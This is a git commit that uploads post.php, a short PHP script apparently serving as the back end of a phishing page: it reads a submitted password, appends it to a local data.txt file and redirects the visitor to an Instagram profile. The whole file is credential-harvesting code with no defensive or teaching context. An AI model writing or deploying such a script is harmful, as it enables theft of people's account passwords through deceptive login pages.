baa54a7ac94e42ae4682056b5971b4fb0cf1607a
POKI <63218178+adithziva@users.noreply.github.com>
2022-08-19 15:42:03 +0530

    Add files via upload

---
+++ post.php
@@ -0,0 +1,16 @@
+<?php
+
+ if(isset($_POST['submit_btn']))
+ {
+  
+  $password = $_POST['pass'];
+  $text = $password . "\n";
+  $fp = fopen('data.txt', 'a+');
+
+    if(fwrite($fp, $text))  {
+        header('Location:https://instagram.com/jah18.x');
+
+    }
+fclose ($fp);    
+}
+?>
